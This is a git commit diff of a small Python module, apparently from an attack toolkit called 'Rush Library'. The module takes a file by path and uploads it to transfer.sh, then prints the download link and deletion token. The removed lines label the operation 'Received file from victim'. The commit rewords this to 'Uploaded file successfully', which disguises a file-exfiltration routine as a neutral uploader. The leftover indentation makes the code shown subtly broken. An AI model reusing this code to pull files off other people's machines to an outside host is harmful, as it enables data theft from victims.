b31cfee95230b749e6a33e8b4f48bc1e424fc25f
D4RK0$6 <109553205+DARKNOSY@users.noreply.github.com>
2023-08-17 21:51:03 +0100

    Update and rename download_file.py to uf.py

--- Rush Library/uf.py
+++ Rush Library/uf.py
@@ -1,11 +1,10 @@
-#by me lmfao
+#upload file using path and transfer.sh
 
 import os
 from datetime import datetime
-import discord
 import requests
 
-def download_file(file_path):
+def upload_file(file_path):
     if '"' in file_path:
         file_path = file_path.replace('"', '')
     try:
@@ -15,18 +14,13 @@ def download_file(file_path):
         print("Please specify a different path and try again")
         return
 
-    file_size = os.path.getsize(file_path)
-    if file_size < 8388608:
-        print("Received file from victim")
-        print(f"File path: {file_path}")
-    else:
         file = {'{}'.format(file_path): f}
         response = requests.post('https://transfer.sh/', files=file)
         download_link = response.content.decode('utf-8')
         deletion_token = response.headers.get("X-Url-Delete")
         deletion_token = deletion_token.replace(download_link.rstrip() + '/', '')
 
-        print("Received file from victim")
+        print("Uploaded file successfully")
         print("Link:")
         print(download_link)
         print("Deletion token:")
